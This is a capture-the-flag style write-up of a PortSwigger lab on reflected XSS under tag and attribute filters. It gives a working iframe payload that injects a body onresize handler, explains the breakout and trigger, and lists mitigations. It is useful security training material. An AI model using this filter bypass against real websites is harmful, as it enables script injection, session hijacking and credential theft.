# 🛡️ XSS via `onresize` Event (Bypassing Tag & Attribute Filters)

## 📌 Lab Title

Reflected XSS with limited allowed HTML tags and attributes

---

## 🎯 Objective

Exploit a reflected XSS vulnerability where most HTML tags and attributes are blocked, except a few like `<body>` and the `onresize` event.

---

## 🔍 Vulnerability Summary

The application reflects user input inside the HTML response but applies strict filtering:

* Most tags are blocked
* Most event handlers are blocked
* However, `<body>` tag and `onresize` event are allowed

This creates a **restricted XSS scenario**, where execution is still possible using browser-triggered events.

---

## ⚙️ Root Cause

Improper input sanitization allows:

* Injection of `<body>` tag
* Execution of JavaScript via `onresize` event

The application fails to:

* Fully sanitize HTML context
* Restrict dangerous event handlers like `onresize`

---

## 💣 Exploit Payload

```html
<iframe src="https://0af600ee045ef3dd81286b2100ce0095.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
onload="this.style.width='500px'">
```

---

## 🧠 Exploit Explanation

### 1. Attribute Breakout

```
">
```

Breaks out of the existing HTML attribute context.

---

### 2. Inject Malicious Tag

```html
<body onresize=print()>
```

* Injects a valid allowed tag (`body`)
* Uses allowed event (`onresize`) to execute JavaScript

---

### 3. Trigger Execution via iframe

```html
onload="this.style.width='500px'"
```

* When iframe loads, width changes
* This triggers a **resize event**
* The `onresize` handler executes → `print()`

---

## 🚀 Exploitation Steps

1. Go to the exploit server
2. Insert the payload inside the body
3. Click **Store exploit**
4. Click **Deliver to victim**
5. The victim loads the page → XSS triggers → lab solved ✅

---

## ⚠️ Key Learning Points

* Even heavily filtered environments can be bypassed
* Lesser-known events (`onresize`) can lead to XSS
* Browser behavior (like resize events) can be abused
* Always test:

  * Rare HTML tags
  * Uncommon event handlers

---

## 🛡️ Mitigation

* Use proper output encoding (HTML entity encoding)
* Avoid rendering raw user input into HTML
* Implement strict allowlists for tags and attributes
* Use Content Security Policy (CSP)

---

## 🧾 Impact

* Arbitrary JavaScript execution
* Session hijacking
* Credential theft
* Full account takeover (depending on context)

---

## 🏁 Conclusion

This lab demonstrates how even with strong filtering, attackers can exploit overlooked browser events to achieve XSS. Security controls must consider **all possible execution vectors**, not just common ones like `onload` or `onclick`.

---
